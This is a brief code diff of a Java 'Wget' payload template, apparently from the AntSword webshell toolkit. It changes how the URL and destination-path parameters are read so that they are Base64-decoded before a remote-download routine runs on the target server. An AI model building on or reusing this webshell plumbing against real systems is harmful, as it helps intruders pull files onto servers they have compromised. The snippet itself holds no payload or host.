@@ -10,8 +10,8 @@ import java.net.URL;
 public class Wget extends Template {
     @Override
     public String run() throws Exception {
-        String z1 = getParam("antswordargurl");
-        String z2 = getParam("antswordargpath");
+        String z1 = new String(this.Base64DecodeToByte("antswordargurl"), this.cs);
+        String z2 = new String(this.Base64DecodeToByte("antswordargpath"), this.cs);
         return WgetCode(z1, z2);
 
     }
